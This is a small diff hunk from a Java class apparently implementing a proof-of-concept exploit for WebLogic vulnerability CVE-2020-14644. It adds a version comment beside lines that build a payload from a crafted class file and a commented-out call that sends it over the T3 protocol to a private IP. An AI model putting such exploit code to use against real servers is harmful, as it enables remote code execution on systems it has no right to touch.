@@ -31,6 +31,7 @@ public class CVE_2020_14644 {
         // T3 send, you can also use python script. weblogic_t3.py
 //        T3ProtocolOperation.send("172.16.1.130", "7001", payload);
 
+        // for 12.2.1.4 only.
         String path = "C:\\Users\\Administrator\\Downloads\\CVE-2020-2555-master\\src\\com\\tangosol\\internal\\util\\invoke\\lambda\\LambdaIdentity$423B02C050017B24DB10DFF759AA56BF.class";
         Object obj = generatePayload(path);
         // test
